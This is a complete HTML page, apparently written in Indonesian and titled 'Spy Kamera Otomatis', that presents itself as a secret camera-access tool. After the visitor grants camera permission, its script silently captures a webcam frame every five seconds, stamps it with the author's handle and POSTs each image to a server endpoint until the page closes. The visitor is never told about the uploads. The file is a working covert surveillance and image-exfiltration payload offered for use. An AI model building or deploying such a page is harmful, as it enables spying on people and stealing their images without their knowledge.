<!DOCTYPE html>
<html>
  <head>
    <title>Spy Kamera Otomatis</title>
    <style>
      .photo-container {
        position: relative;
        display: inline-block;
      }

      .overlay {
        position: absolute;
        top: 10px;
        left: 10px;
        background-color: rgba(0, 0, 0, 0.5);
        color: white;
        padding: 5px;
        font-size: 14px;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <h2>Akses Kamera Diam-diam</h2>
    <video id="video" autoplay playsinline width="320" height="240"></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");
      let spamInterval;

      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          video.srcObject = stream;

          // Mulai spam foto setiap 5 detik
          spamInterval = setInterval(() => {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Tambahkan teks pada gambar sebelum dikirim
            context.font = "20px Arial";
            context.fillStyle = "rgba(0, 0, 0, 0.7)";  // Set warna teks
            context.fillText("Dev By @FazrrEdan", 10, 30);  // Posisi teks di atas gambar

            const imageData = canvas.toDataURL("image/jpeg");

            fetch("/api/kirim", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ image: imageData }),
            });
          }, 5000); // ambil foto tiap 5 detik
        })
        .catch((err) => {
          alert("Gagal akses kamera: " + err);
        });

      // Hentikan spam kalau user keluar/close
      window.addEventListener("beforeunload", () => {
        clearInterval(spamInterval);
      });
    </script>
  </body>
</html>
